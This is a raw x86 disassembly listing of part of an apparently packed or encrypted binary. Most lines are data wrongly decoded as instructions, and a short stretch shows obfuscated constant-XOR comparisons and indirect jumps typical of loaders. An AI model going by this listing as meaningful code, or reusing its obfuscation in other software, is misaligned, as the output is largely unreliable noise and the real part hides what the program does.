  40745d:	ror    bl,cl
  40745f:	adc    eax,0x9afda521
  407464:	jg     0x407495
  407466:	ffreep st(5)
  407469:	sbb    edi,esi
  40746b:	sbb    cl,dh
  40746d:	mov    eax,ds:0xb5cf40cd
  407472:	and    bl,BYTE PTR [ecx+0x44563757]
  407478:	sub    dl,al
  40747a:	push   es
  40747b:	ins    DWORD PTR es:[edi],dx
  40747c:	ja     0x407477
  40747e:	xchg   edx,eax
  40747f:	jge    0x4074f9
  407481:	xchg   ebx,eax
  407482:	aas    
  407483:	lods   al,BYTE PTR ds:[esi]
  407484:	sub    edx,DWORD PTR [edx+edi*1+0x46408e3c]
  40748b:	aam    0x39
  40748d:	jle    0x407410
  40748f:	dec    edx
  407490:	cwde   
  407491:	aas    
  407492:	jne    0x407421
  407494:	adc    ch,BYTE PTR [ecx+ebx*4+0x21]
  407498:	aad    0x48
  40749a:	adc    al,0x56
  40749c:	les    ebp,FWORD PTR [ecx]
  40749e:	and    eax,0x58b26edb
  4074a3:	inc    DWORD PTR [eax]
  4074a5:	or     eax,0xa2cf22da
  4074aa:	rcr    edi,0x42
  4074ad:	xlat   BYTE PTR ds:[ebx]
  4074ae:	push   0x60e6c879
  4074b3:	mov    BYTE PTR [esi],0xad
  4074b6:	daa    
  4074b7:	pop    edi
  4074b8:	mov    bh,0x75
  4074ba:	and    DWORD PTR [edx],eax
  4074bc:	jmp    0xbaa2e6b9
  4074c1:	cmp    BYTE PTR [edx],dh
  4074c3:	cmp    eax,0xf3454a6a
  4074c8:	aam    0x92
  4074ca:	ins    BYTE PTR es:[edi],dx
  4074cb:	adc    al,0xde
  4074cd:	mov    ds:0x48ccd407,al
  4074d2:	jnp    0x4074d1
  4074d4:	add    BYTE PTR [ecx+esi*4-0x439b697b],0xa2
  4074dc:	mov    ch,0x2b
  4074de:	mov    ah,0xb9
  4074e0:	fldenv [ecx+edx*8-0x64]
  4074e4:	je     0x40746a
  4074e6:	pushf  
  4074e7:	lods   al,BYTE PTR ds:[esi]
  4074e8:	test   eax,0xc199a2c9
  4074ed:	in     al,dx
  4074ee:	aas    
  4074ef:	or     al,0x21
  4074f1:	loopne 0x4074f9
  4074f3:	(bad)  
  4074f4:	iret   
  4074f5:	les    edx,FWORD PTR [edx+0xe]
  4074f8:	pop    ebx
  4074f9:	dec    ecx
  4074fa:	mov    dh,0x4
  4074fc:	rcl    BYTE PTR [ebp+0x40ac0ac1],cl
  407502:	fadd   DWORD PTR [esi]
  407504:	sahf   
  407505:	ja     0x407512
  407507:	mov    edi,0x40990775
  40750c:	inc    ebp
  40750d:	loope  0x407570
  40750f:	add    esi,DWORD PTR [edi-0x710e5de4]
  407515:	fcom   DWORD PTR [eax-0xc62d7d7]
  40751b:	jo     0x407509
  40751d:	dec    edx
  40751e:	aad    0xa7
  407520:	mov    cl,0x52
  407522:	cmp    DWORD PTR [ebx-0x4d48d445],ecx
  407528:	push   edi
  407529:	lds    ecx,FWORD PTR [esi]
  40752b:	jno    0x407565
  40752d:	mov    ch,0xe6
  40752f:	push   edi
  407530:	std    
  407531:	ror    ebx,cl
  407533:	sbb    al,0x3c
  407535:	loope  0x407538
  407537:	daa    
  407538:	xchg   BYTE PTR [eax],ah
  40753a:	push   cs
  40753b:	mov    cl,0x9e
  40753d:	sti    
  40753e:	sub    al,0x64
  407540:	test   BYTE PTR [edx-0x6bc598ab],bh
  407546:	pushf  
  407547:	in     eax,0xfe
  407549:	adc    bl,dh
  40754b:	fsubr  st(7),st
  40754d:	mov    DWORD PTR [ecx+0xb],ecx
  407550:	(bad)  
  407551:	sbb    DWORD PTR [ebx+0x469c1d95],ebp
  407557:	cld    
  407558:	push   ds
  407559:	sbb    esp,DWORD PTR [edx+ebp*8]
  40755c:	pop    edx
  40755d:	mov    esi,0x7907ced3
  407562:	dec    edi
  407563:	sub    bl,BYTE PTR [eax]
  407565:	and    ebx,DWORD PTR [esp+edx*8-0x6c60f0c9]
  40756c:	jno    0x407513
  40756e:	cmp    ch,BYTE PTR [eax-0x61d33860]
  407574:	retf   
  407575:	push   ecx
  407576:	clc    
  407577:	arpl   WORD PTR [ecx],bx
  407579:	data16 in al,dx
  40757b:	sub    BYTE PTR [ecx+0x68d9a09c],bh
  407581:	add    al,0x3b
  407583:	test   eax,0xadc95ab2
  407588:	xchg   edi,eax
  407589:	fsub   QWORD PTR [eax]
  40758b:	shr    DWORD PTR [edx],cl
  40758d:	inc    ebx
  40758e:	jle    0x4075f8
  407590:	push   0xa540c5ab
  407595:	inc    edx
  407596:	pop    ds
  407597:	cmp    al,0xcf
  407599:	pop    ds
  40759a:	repnz xchg esi,eax
  40759c:	enter  0xcab8,0xa6
  4075a0:	fcmovnbe st,st(2)
  4075a2:	test   al,0x8c
  4075a4:	push   edx
  4075a5:	add    BYTE PTR [ebp-0x35df750f],ch
  4075ab:	adc    ch,BYTE PTR [esi-0x4396f5c]
  4075b1:	xor    esp,DWORD PTR [ebx+0x29]
  4075b4:	jo     0x4075fc
  4075b6:	push   ecx
  4075b7:	(bad)  
  4075b9:	test   al,0x8c
  4075bb:	jl     0x40755c
  4075bd:	scas   eax,DWORD PTR es:[edi]
  4075be:	inc    ebp
  4075bf:	sub    bl,BYTE PTR [edi]
  4075c1:	sbb    BYTE PTR [eax-0x7f92e95e],al
  4075c7:	pusha  
  4075c8:	aaa    
  4075c9:	ins    DWORD PTR es:[edi],dx
  4075ca:	lahf   
  4075cb:	dec    edx
  4075cc:	and    cl,BYTE PTR [edi+0x7d97fa38]
  4075d2:	cwde   
  4075d3:	cmp    BYTE PTR [edi],dl
  4075d5:	(bad)  
  4075d7:	fidiv  DWORD PTR [edi+0x3c76f66f]
  4075dd:	sbb    eax,0x9a37cac7
  4075e2:	sub    al,0x8e
  4075e4:	ficomp DWORD PTR [edi]
  4075e6:	mov    eax,DWORD PTR [eax]
  4075e8:	or     DWORD PTR [ebx],0x7b
  4075eb:	jne    0x40762c
  4075ed:	fs repnz stc 
  4075f0:	and    eax,0x56b5fe7c
  4075f5:	push   0x680ca8d2
  4075fa:	inc    eax
  4075fb:	sub    esp,DWORD PTR [esi]
  4075fd:	push   esp
  4075fe:	or     ebx,ecx
  407600:	jno    0x407679
  407602:	sahf   
  407603:	pop    es
  407604:	sti    
  407605:	mov    esp,0xdc8884b5
  40760a:	add    al,0xf7
  40760c:	bound  esp,QWORD PTR [edx+ecx*2]
  40760f:	(bad)  [ebp-0x3f4d0d20]
  407615:	fadd   DWORD PTR [esi]
  407617:	jae    0x407641
  407619:	jno    0x407660
  40761b:	jge    0x40760e
  40761d:	xchg   BYTE PTR [edx-0x4ef45108],al
  407623:	fs pop ds
  407625:	shl    DWORD PTR [edi-0x1c],0x4b
  407629:	push   ss
  40762a:	es push edi
  40762c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40762d:	shr    DWORD PTR [bp+si],1
  407630:	xor    al,0x1b
  407632:	mov    BYTE PTR [edi+0x3c],0xc8
  407636:	lods   eax,DWORD PTR ds:[esi]
  407637:	out    dx,eax
  407638:	mov    esp,0xae61cbce
  40763d:	pop    ebp
  40763e:	das    
  40763f:	sub    eax,0x5c663d97
  407644:	fsub   st(0),st
  407646:	ffree  st(0)
  407648:	ins    BYTE PTR es:[edi],dx
  407649:	jno    0x40765d
  40764b:	repz aam 0xd5
  40764e:	pop    edi
  40764f:	lahf   
  407650:	in     al,0x7d
  407652:	fbstp  TBYTE PTR [edi+0x337b832d]
  407658:	call   0x475ab354
  40765d:	sub    DWORD PTR [ebp+0x66],esp
  407660:	ins    DWORD PTR es:[edi],dx
  407661:	cli    
  407662:	or     ebp,DWORD PTR [ecx+0x1c2c225e]
  407668:	dec    eax
  407669:	out    dx,al
  40766a:	mov    edx,0x90b614b4
  40766f:	pop    eax
  407670:	gs test eax,0xbce17526
  407676:	fwait
  407677:	add    eax,0x913b8320
  40767c:	push   edi
  40767d:	ins    DWORD PTR es:[edi],dx
  40767e:	test   BYTE PTR [eax+0x6bd84233],dl
  407684:	xchg   ecx,eax
  407685:	jg     0x407661
  407687:	imul   edx,DWORD PTR [ebx+ebp*1-0x1d],0x2e
  40768c:	inc    eax
  40768d:	cmp    BYTE PTR [ebx],dl
  40768f:	jns    0x407690
  407691:	into   
  407692:	ficom  WORD PTR [edx+0x60a91e56]
  407698:	pop    esi
  407699:	gs ret 0xaf7b
  40769d:	jmp    0x571f:0xb04a4926
  4076a4:	push   ss
  4076a5:	les    ecx,FWORD PTR [ebx+0x46]
  4076a8:	lea    ebx,[ecx+ecx*2+0x27ace00b]
  4076af:	loopne 0x407710
  4076b1:	jp     0x4076ab
  4076b3:	test   DWORD PTR [edi],ecx
  4076b5:	and    BYTE PTR [ecx],al
  4076b7:	imul   esi,esp,0x2ca43cac
  4076bd:	or     al,0x36
  4076bf:	je     0x4076bf
  4076c1:	ret    0x1416
  4076c4:	mov    bl,BYTE PTR [esi]
  4076c6:	sub    eax,0xc35d4a6c
  4076cb:	add    ch,bl
  4076cd:	xchg   ebx,eax
  4076ce:	jge    0x407697
  4076d0:	add    BYTE PTR [eax-0x48],bh
  4076d3:	pop    es
  4076d4:	not    DWORD PTR [ebx]
  4076d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076d7:	inc    BYTE PTR [ebp-0x10]
  4076da:	push   ebp
  4076db:	inc    esi
  4076dc:	add    ebx,esi
  4076de:	jb     0x407677
  4076e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076e1:	pop    eax
  4076e2:	out    dx,eax
  4076e3:	mov    eax,0x43cd3d8d
  4076e8:	add    al,0xd0
  4076ea:	mov    WORD PTR [ebx-0xa],fs
  4076ed:	mov    al,ds:0xc3cca172
  4076f2:	or     BYTE PTR [edx-0x52089d71],ch
  4076f8:	arpl   dx,bx
  4076fa:	xlat   BYTE PTR ds:[ebx]
  4076fb:	add    eax,0xd0c0f5a7
  407700:	imul   esp,edx,0x1c
  407703:	mov    ebx,0x854ef317
  407708:	sub    BYTE PTR [esi],bl
  40770a:	xor    BYTE PTR [ecx+edi*2],al
  40770d:	inc    DWORD PTR ds:0x76639827
  407713:	shr    edx,cl
  407715:	in     al,0x14
  407717:	in     al,0xb1
  407719:	mov    ebx,0x667e534a
  40771e:	scas   eax,DWORD PTR es:[edi]
  40771f:	imul   esp,edi,0x4bfa9936
  407725:	sbb    BYTE PTR [eax+0x71],al
  407728:	cmp    DWORD PTR [ebp-0x25],ecx
  40772b:	lock pusha 
  40772d:	cmp    DWORD PTR [edx],ebp
  40772f:	fidiv  DWORD PTR [esi+0x16]
  407732:	adc    ecx,DWORD PTR es:[edi+0x12]
  407736:	xchg   esp,eax
  407737:	mov    ds:0xf486f51f,al
  40773c:	mov    eax,0xabc51194
  407741:	xchg   ecx,eax
  407742:	lock leave 
  407744:	cmp    eax,0x7565643
  407749:	adc    dl,BYTE PTR [edx+0x357416c2]
  40774f:	push   ds
  407750:	and    al,0x4e
  407752:	xchg   esp,eax
  407753:	inc    edi
  407754:	add    eax,DWORD PTR [ecx-0x54]
  407757:	in     eax,dx
  407758:	jl     0x407799
  40775a:	dec    ecx
  40775b:	jmp    0x407706
  40775d:	out    dx,eax
  40775e:	(bad)  
  40775f:	test   al,0x2b
  407761:	das    
  407762:	int3   
  407763:	mov    DWORD PTR [esi-0x6f],eax
  407766:	imul   edx,DWORD PTR [ecx+0x2b8ed5ea],0xc71db075
  407770:	lds    ebx,FWORD PTR [ebp-0x67]
  407773:	cmp    eax,0x1c690bbd
  407778:	add    esi,DWORD PTR [ebx+0x2784507a]
  40777e:	mov    ebp,0x669e739a
  407783:	inc    esi
  407784:	test   eax,0x35c30ffd
  407789:	xor    bh,0x23
  40778c:	rol    BYTE PTR [ecx],0x3a
  40778f:	push   esp
  407790:	mov    dh,0x57
  407792:	lock mov ebp,DWORD PTR [ebx]
  407795:	pop    edx
  407796:	adc    eax,0xffbb6847
  40779b:	xchg   edi,eax
  40779c:	push   cs
  40779d:	xchg   ebx,eax
  40779e:	ds aaa 
  4077a0:	fcomp  DWORD PTR [eax]
  4077a2:	pushf  
  4077a3:	sti    
  4077a4:	xlat   BYTE PTR ds:[ebx]
  4077a5:	inc    ebp
  4077a6:	xchg   esp,eax
  4077a7:	cmp    al,0xa8
  4077a9:	mov    dh,0xaf
  4077ab:	mov    bh,0xa8
  4077ad:	adc    DWORD PTR [edi],ebp
  4077af:	mov    bh,0xa4
  4077b1:	dec    esp
  4077b2:	pushf  
  4077b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077b4:	out    0xc2,eax
  4077b6:	sbb    dh,BYTE PTR [esi-0x34]
  4077b9:	test   eax,0x50acbb30
  4077be:	or     edx,DWORD PTR [ecx+0x12]
  4077c1:	jnp    0x40782b
  4077c3:	je     0x40775a
  4077c5:	fwait
  4077c6:	xchg   esi,eax
  4077c7:	mov    edx,0xafeb7675
  4077cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077cd:	jge    0x4077c2
  4077cf:	ror    DWORD PTR ds:0x1e6c0106,0xd2
  4077d6:	cmc    
  4077d7:	das    
  4077d8:	and    BYTE PTR [ebp+0xd],bl
  4077db:	std    
  4077dc:	and    dh,BYTE PTR [ebp+0x7e]
  4077df:	cmp    dl,dh
  4077e1:	adc    esi,edi
  4077e3:	mov    ebx,0x85216382
  4077e8:	mov    esp,0xfd6da1cf
  4077ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077ee:	jecxz  0x407851
  4077f0:	inc    ebx
  4077f1:	fild   DWORD PTR [edx+0x7a5d6606]
  4077f7:	(bad)  
  4077f8:	dec    DWORD PTR [ebx+esi*2-0x37]
  4077fc:	cld    
  4077fd:	cmp    DWORD PTR [edi+0x1d],eax
  407800:	repz push ecx
  407802:	js     0x4077aa
  407804:	sti    
  407805:	mov    al,ds:0x548b11af
  40780a:	aaa    
  40780b:	mov    es,eax
  40780d:	jns    0x4077d5
  40780f:	retf   0xd23b
  407812:	mov    ds:0xbc63bd72,eax
  407817:	fsubp  st(3),st
  407819:	adc    DWORD PTR ds:0x11dd71b9,ecx
  40781f:	ins    BYTE PTR es:[edi],dx
  407820:	xor    esi,esi
  407822:	scas   al,BYTE PTR es:[edi]
  407823:	and    bl,BYTE PTR [esi*2-0x7c029e51]
  40782a:	or     DWORD PTR [edx-0x4118e7fd],eax
  407830:	add    cl,cl
  407832:	push   0xffffffea
  407834:	fimul  WORD PTR [ebp-0x15279df9]
  40783a:	daa    
  40783b:	mov    ecx,0xee4c0a79
  407840:	mov    eax,0x4e6ecfb5
  407845:	push   ds
  407846:	repz stc 
  407848:	pop    esp
  407849:	push   esp
  40784a:	int3   
  40784b:	daa    
  40784c:	popf   
  40784d:	es ins BYTE PTR es:[edi],dx
  40784f:	mov    bh,0xd5
  407851:	pop    es
  407852:	push   ebp
  407853:	sub    DWORD PTR ds:0xd7a9e3ba,0x1f
  40785a:	or     eax,0xb0441d39
  40785f:	inc    edx
  407860:	pop    esi
  407861:	fstp   QWORD PTR [ebp+0x3c]
  407864:	shr    dh,cl
  407866:	inc    ecx
  407867:	pop    esp
  407868:	cmp    al,0x72
  40786a:	imul   esp,DWORD PTR ds:0x980bc20c,0xd512a313
  407874:	add    al,0x16
  407876:	mov    eax,ds:0xb61c48ea
  40787b:	pop    ebp
  40787c:	or     ecx,DWORD PTR [ebp-0x33c9d43]
  407882:	dec    esi
  407883:	in     eax,0xd0
  407885:	sbb    edx,DWORD PTR [edx+0x706169fa]
  40788b:	cmp    esi,edx
  40788d:	mov    ah,0x8
  40788f:	(bad)  
  407890:	dec    ebx
  407891:	xlat   BYTE PTR ds:[ebx]
  407892:	sub    DWORD PTR [ecx-0x24],ebp
  407895:	aad    0x66
  407897:	inc    esi
  407898:	push   0x6b
  40789a:	jg     0x407845
  40789c:	xor    cl,BYTE PTR [esi+0x79]
  40789f:	and    ebx,esp
  4078a1:	push   0xe8f8a1aa
  4078a6:	bound  edx,QWORD PTR [edi-0x7e9533b2]
  4078ac:	mov    ecx,0x1280c654
  4078b1:	inc    ecx
  4078b2:	push   esi
  4078b3:	xor    esp,esi
  4078b5:	sbb    DWORD PTR [edx],ebx
  4078b7:	mov    DWORD PTR [esi+0x78],ecx
  4078ba:	add    DWORD PTR [edi],0x55
  4078bd:	add    al,0xc9
  4078bf:	xlat   BYTE PTR ds:[ebx]
  4078c0:	es xchg edx,eax
  4078c2:	jmp    0xfc5b4a7a
  4078c7:	mov    al,ds:0x11902dea
  4078cc:	add    al,0xc8
  4078ce:	jmp    0x3dddd2b8
  4078d3:	cmovno edi,esi
  4078d6:	imul   ecx,DWORD PTR [esi+0x5cb82829],0x478fc45f
  4078e0:	fnstcw WORD PTR [eax-0x6c]
  4078e3:	sbb    BYTE PTR [edx+0x2f62fa60],al
  4078e9:	dec    ecx
  4078ea:	test   DWORD PTR [eax+0xf],esi
  4078ed:	in     eax,0x12
  4078ef:	push   ss
  4078f0:	out    dx,al
  4078f1:	xor    esi,DWORD PTR [edi+edi*2+0x4b8da6d]
  4078f8:	pop    esi
  4078f9:	out    0xdb,eax
  4078fb:	shl    DWORD PTR fs:[edi],1
  4078fe:	pop    ss
  4078ff:	xchg   ebp,eax
  407900:	dec    edi
  407901:	jae    0x407922
  407903:	shl    DWORD PTR [eax-0x365a8b53],cl
  407909:	cli    
  40790a:	xchg   esp,eax
  40790b:	je     0x40793e
  40790d:	jmp    0xf527:0x9498d523
  407914:	ss sub eax,0x52ac7db2
  40791a:	test   BYTE PTR [ecx+0x77],0xe2
  40791e:	mov    dh,BYTE PTR [ebx]
  407920:	xchg   ebp,eax
  407921:	lock out dx,al
  407923:	sub    BYTE PTR [esp+esi*8-0x1749d9a1],dl
  40792a:	repnz or dl,dh
  40792d:	mov    cl,0xff
  40792f:	xor    DWORD PTR [esi-0x7da81ed4],esp
  407935:	addr16 push ecx
  407937:	xchg   esp,eax
  407938:	lock ins DWORD PTR es:[edi],dx
  40793a:	adc    edi,ebx
  40793c:	out    0x84,al
  40793e:	jns    0x407970
  407940:	test   ecx,edx
  407942:	outs   dx,BYTE PTR ds:[esi]
  407943:	test   al,0x65
  407945:	mov    DWORD PTR [ebx-0xd],eax
  407948:	push   edi
  407949:	xchg   edx,eax
  40794a:	or     al,ch
  40794c:	pushf  
  40794d:	mov    esp,0x2d00ea97
  407952:	mov    ah,0x84
  407954:	mov    al,0x29
  407956:	jne    0x407987
  407958:	imul   eax,DWORD PTR [ebp+0x41],0x8916ccab
  40795f:	fwait
  407960:	sbb    eax,0x99a323d5
  407965:	xor    eax,0xfdade7ec
  40796a:	pop    ds
  40796b:	jl     0x4079a2
  40796d:	ret    
  40796e:	push   eax
  40796f:	nop
  407970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407971:	mov    al,ds:0xf60f87aa
  407976:	repnz and cl,BYTE PTR [ebx]
  407979:	sbb    ecx,ecx
  40797b:	out    0x99,eax
  40797d:	outs   dx,BYTE PTR ds:[esi]
  40797e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40797f:	clc    
  407980:	add    eax,0x4dc6351b
  407985:	lahf   
  407986:	stos   DWORD PTR es:[edi],eax
  407987:	pop    ebx
  407988:	push   cs
  407989:	jmp    0x5e322979
  40798e:	les    esp,FWORD PTR [esi-0x36ca5107]
  407994:	inc    edi
  407995:	pop    esi
  407996:	sub    BYTE PTR [edx],ah
  407998:	mov    cl,BYTE PTR [edx-0x6e]
  40799b:	cmp    al,0xb5
  40799d:	sub    bh,bh
  40799f:	mov    eax,DWORD PTR [edi+0x45]
  4079a2:	jle    0x4079ec
  4079a4:	cmp    bh,bl
  4079a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079a7:	push   es
  4079a8:	sbb    eax,0xce7e39ae
  4079ad:	add    al,0xe2
  4079af:	cdq    
  4079b0:	jp     0x4079cc
  4079b2:	push   cs
  4079b3:	push   ds
  4079b4:	mov    eax,0x39e4a21
  4079b9:	fcomip st,st(1)
  4079bb:	mov    ebx,0x83b70f5f
  4079c0:	push   cs
  4079c1:	lea    esp,[esi-0x55]
  4079c4:	or     eax,0x9244e317
  4079c9:	sbb    DWORD PTR [ecx+edx*1+0x877faf9],ecx
  4079d0:	dec    ebx
  4079d1:	pop    ecx
  4079d2:	mov    ebp,0xefdc53e2
  4079d7:	mov    edx,0xb62a4f83
  4079dc:	lods   eax,DWORD PTR ds:[esi]
  4079dd:	clc    
  4079de:	cli    
  4079df:	jnp    0x407a51
  4079e1:	int    0x81
  4079e3:	sbb    edi,DWORD PTR [esi-0x67fb1bb1]
  4079e9:	in     al,0xa8
  4079eb:	jp     0x407a34
  4079ed:	cdq    
  4079ee:	pop    ecx
  4079ef:	ret    
  4079f0:	pop    ebp
  4079f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079f2:	jmp    0x4079f0
  4079f4:	mov    edi,0x241ec27e
  4079f9:	lds    esp,FWORD PTR [edi-0x13f6d78b]
  4079ff:	and    BYTE PTR [edi+0x2c],bh
  407a02:	push   edx
  407a03:	loopne 0x407a2a
  407a05:	test   ebx,eax
  407a07:	sub    DWORD PTR [ecx+0x28],0xad59eb7
  407a0e:	mov    al,0x71
  407a10:	pop    ds
  407a11:	add    ch,BYTE PTR [ebp+esi*1-0x40]
  407a15:	shr    BYTE PTR [ebx],cl
  407a17:	pushf  
  407a18:	sbb    ebx,DWORD PTR [eax]
  407a1a:	inc    eax
  407a1b:	jno    0x407a0b
  407a1d:	in     al,dx
  407a1e:	sti    
  407a1f:	test   al,0x69
  407a21:	pusha  
  407a22:	pop    ebx
  407a23:	mov    bh,0xa4
  407a25:	mov    esi,0xb1170259
  407a2a:	ds ins DWORD PTR es:[edi],dx
  407a2c:	adc    eax,0x36b99270
  407a31:	cmp    edx,DWORD PTR [esi-0x6e]
  407a34:	(bad)  
  407a35:	loop   0x407a5d
  407a37:	jge    0x4079ba
  407a39:	imul   ebx,DWORD PTR [ecx+edi*2+0x77],0xd
  407a3e:	stos   BYTE PTR es:[edi],al
  407a3f:	aam    0xc6
  407a41:	fsub   st(0),st
  407a43:	adc    eax,0xfc4d8b76
  407a48:	mov    edx,DWORD PTR [ebp-0x30]
  407a4b:	xor    ecx,ebx
  407a4d:	add    ecx,eax
  407a4f:	cmp    edx,ecx
  407a51:	je     0x407abe
  407a57:	lea    eax,[ebp-0x8]
  407a5a:	push   eax
  407a5b:	push   DWORD PTR [ebp-0x28]
  407a5e:	push   DWORD PTR [ebp+0xc]
  407a61:	call   0x40f238
  407a66:	mov    eax,0x3272dd
  407a6b:	mov    ecx,DWORD PTR [ebp-0x4]
  407a6e:	mov    edx,DWORD PTR [ebp-0x8]
  407a71:	xor    ecx,ebx
  407a73:	add    ecx,eax
  407a75:	cmp    edx,ecx
  407a77:	je     0x407a92
  407a7d:	mov    ecx,DWORD PTR [ebp-0x34]
  407a80:	movzx  ecx,WORD PTR [ecx+esi*2]
  407a84:	mov    edx,DWORD PTR [ebp-0x18]
  407a87:	mov    ecx,DWORD PTR [edx+ecx*4]
  407a8a:	mov    DWORD PTR [ebp-0x38],ecx
  407a8d:	jmp    0x4056db
  407a92:	mov    ecx,DWORD PTR [ebp-0x14]
  407a95:	xor    ecx,ebx
  407a97:	lea    esi,[esi+ecx*1+0x3272dd]
  407a9e:	jmp    0x40540c
  407aa3:	mov    eax,DWORD PTR [ebp-0x4]
  407aa6:	xor    eax,ebx
  407aa8:	add    eax,edi
  407aaa:	jmp    0x409f7a
  407aaf:	mov    eax,DWORD PTR [ebp-0x4]
  407ab2:	xor    eax,ebx
  407ab4:	add    eax,0x3272dd
  407ab9:	jmp    0x409f7a
  407abe:	mov    ecx,DWORD PTR [ebp-0x38]
  407ac1:	add    ecx,DWORD PTR [ebp+0x8]
  407ac4:	mov    DWORD PTR [ebp-0x10],ecx
  407ac7:	mov    ecx,DWORD PTR [ebp-0x1c]
  407aca:	test   ecx,ecx
  407acc:	je     0x409f05
  407ad2:	mov    DWORD PTR [ebp-0x20],0x0
  407ad9:	push   0x3
  407adb:	xor    edx,edx
  407add:	pop    edx
  407ade:	add    edx,0x8
  407ae1:	push   edx
  407ae2:	pop    ecx
  407ae3:	push   0x6
  407ae5:	dec    ecx
  407ae6:	pop    ebx
  407ae7:	dec    ebx
  407ae8:	xchg   ebx,ecx
  407aea:	sub    ebx,ecx
  407aec:	xchg   ebx,ecx
  407aee:	dec    ecx
  407aef:	mov    eax,DWORD PTR [ebp-0x1c]
  407af2:	imul   eax,ecx
  407af5:	sub    esp,eax
  407af7:	mov    DWORD PTR [ebp-0x20],esp
  407afa:	mov    eax,DWORD PTR [ebp-0x4]
  407afd:	mov    ecx,0x7510896
  407b02:	xor    eax,ecx
  407b04:	mov    edx,0x3272dd
  407b09:	add    eax,edx
  407b0b:	mov    DWORD PTR [ebp+0x8],eax
  407b0e:	mov    eax,DWORD PTR [ebp-0x14]
  407b11:	xor    eax,ecx
  407b13:	add    eax,edx
  407b15:	mov    edx,DWORD PTR [ebp+0x14]
  407b18:	jmp    0x409e70
  407b1d:	push   es
  407b1e:	or     DWORD PTR [esi],ebx
  407b20:	xchg   DWORD PTR [ecx],eax
  407b22:	xchg   DWORD PTR [ebx+0x7caff18b],ecx
  407b28:	xor    eax,0x848ea41d
  407b2d:	nop
  407b2e:	and    BYTE PTR [edx+0x7a],bh
  407b31:	aaa    
  407b32:	pop    edi
  407b33:	jp     0x407baf
  407b35:	or     BYTE PTR [edx+0x63],cl
  407b38:	jl     0x407b4f
  407b3a:	ja     0x407b2f
  407b3c:	jo     0x407b4e
  407b3e:	mov    WORD PTR [esi],ss
  407b40:	add    BYTE PTR [ebx],bh
  407b42:	fwait
  407b43:	mov    ss,ebp
  407b45:	fsubr  DWORD PTR [ecx]
  407b47:	(bad)  
  407b48:	push   eax
  407b49:	repz cli 
  407b4b:	fimul  WORD PTR [ecx]
  407b4d:	addr16 jp 0x407b96
  407b50:	repz dec eax
  407b52:	or     BYTE PTR [edx+0x27bb7652],bh
  407b58:	push   ss
  407b59:	sbb    DWORD PTR [eiz*2-0x41066274],edi
  407b60:	pop    es
  407b61:	jmp    0x407b82
  407b63:	push   es
  407b64:	xchg   DWORD PTR [ebx+0xd],edi
  407b67:	int3   
  407b68:	or     edi,DWORD PTR [esi]
  407b6a:	ss loop 0x407b79
  407b6d:	xlat   BYTE PTR ds:[ebx]
  407b6e:	mov    ebp,0x90703741
  407b73:	int    0x75
  407b75:	out    dx,al
  407b76:	adc    DWORD PTR [edi+0x67cc3615],edx
  407b7c:	fdivr  st,st(7)
  407b7e:	in     al,dx
  407b7f:	sbb    bl,BYTE PTR [ebp-0x65]
  407b82:	pop    esi
  407b83:	addr16 sub ebx,edx
  407b86:	and    BYTE PTR [ecx-0x36],0x32
  407b8a:	and    BYTE PTR [edi],bl
  407b8c:	jmp    0x407b4b
  407b8e:	and    al,0x85
  407b90:	and    DWORD PTR [edi-0x7c],edx
  407b93:	fcmovu st,st(6)
  407b95:	outs   dx,BYTE PTR ds:[esi]
  407b96:	inc    ebx
  407b97:	dec    esi
  407b98:	sbb    dh,bh
  407b9a:	(bad)  
  407b9b:	dec    edi
  407b9c:	aad    0xfd
  407b9e:	mov    dl,0x21
  407ba0:	xor    DWORD PTR [edi+0x383e247c],0xffffff82
  407ba7:	imul   edi,DWORD PTR [edi-0x7fc731bb],0xfffffff4
  407bae:	xchg   ecx,esp
  407bb0:	xor    BYTE PTR [esi+eiz*8-0x3a4752d],ah
  407bb7:	arpl   bx,dx
  407bb9:	pop    ebp
  407bba:	add    DWORD PTR [ecx+0x5bc8c746],ecx
  407bc0:	icebp  
  407bc1:	xchg   ebx,eax
  407bc2:	repnz sbb al,cl
  407bc5:	dec    edx
  407bc6:	add    eax,0xd3bb57bd
  407bcb:	pop    ebp
  407bcc:	xchg   edi,eax
  407bcd:	(bad)  
  407bce:	mov    ds:0xd9375e5b,al
  407bd3:	inc    ebp
  407bd4:	(bad)  
  407bd6:	fcomip st,st(4)
  407bd8:	(bad)
  407bdd:	jae    0x407bb2
  407bdf:	or     DWORD PTR [eax+esi*2],ecx
  407be2:	cmp    ch,BYTE PTR [edi]
  407be4:	mov    DWORD PTR [ebp-0x20],ecx
  407be7:	cmp    DWORD PTR [edi+ebp*8],esp
  407bea:	test   cl,cl
  407bec:	fst    DWORD PTR [esi]
  407bee:	mov    ds:0xb2400f15,eax
  407bf3:	lock aas 
  407bf5:	pop    ebx
  407bf6:	sbb    eax,DWORD PTR [esi-0x59]
  407bf9:	in     al,0xcb
  407bfb:	in     al,dx
  407bfc:	test   ecx,ebx
  407bfe:	xchg   esp,eax
  407bff:	jb     0x407bfe
  407c01:	pop    esi
  407c02:	sbb    eax,0xa4f770f0
  407c07:	popf   
  407c08:	sub    eax,0x24a0b6b8
  407c0d:	(bad)  
  407c0e:	les    edi,FWORD PTR [ebx+0x5e]
  407c11:	lds    esi,FWORD PTR [eax-0x4d]
  407c14:	xchg   edi,eax
  407c15:	fisubr DWORD PTR [ebx]
  407c17:	dec    ecx
  407c18:	push   0x2cb26c4b
  407c1d:	jecxz  0x407c63
  407c1f:	rcl    DWORD PTR [ebx-0x4d],cl
  407c22:	xchg   edx,eax
  407c23:	mov    WORD PTR [ecx+0x214a9544],fs
  407c29:	push   ebp
  407c2a:	loopne 0x407c59
  407c2c:	icebp  
  407c2d:	pop    eax
  407c2e:	mov    DWORD PTR [ecx+0x28],ecx
  407c31:	xor    BYTE PTR [edi-0x34a450df],dh
  407c37:	test   al,0xe7
  407c39:	inc    edi
  407c3a:	xor    ebx,DWORD PTR [esi-0x55a50c38]
  407c40:	cmp    edi,DWORD PTR [edx]
